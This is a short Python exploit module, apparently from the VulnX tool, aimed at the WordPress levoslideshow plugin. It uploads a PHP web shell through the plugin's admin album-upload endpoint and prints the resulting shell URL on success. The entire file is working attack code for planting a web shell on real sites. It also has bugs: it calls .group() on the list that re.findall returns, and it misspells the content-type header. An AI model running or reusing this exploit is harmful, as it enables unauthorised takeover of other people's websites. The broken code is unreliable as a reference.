import requests
import re

# levoslideshow
def wp_levoslideshow(url,headers,vulnresults):
    endpoint = url + "/wp-admin/admin.php?page=levoslideshow_manage"
    shell = open('shell/VulnX.php','rb')
    headers['Content_Type'] = 'multipart/form-data'
    options = {
            'album_img':shell,
            'task' : 'lvo_add_new_album',
            'album_name': '',
            'album_desk': '',
    }
    send_shell = requests.post(endpoint,options,headers).text
    check = re.findall("/uploads/levoslideshow/(.*?)/big/VulnX.php/", send_shell)
    if check:
        dump_data = url + "/wp-content/uploads/levoslideshow/"+check.group(1)+"/big/VulnX.php?Vuln=X"
        print ('[+] levoslideshow ' + dump_data + '')
    else:
        print ('[-] levoslideshow ')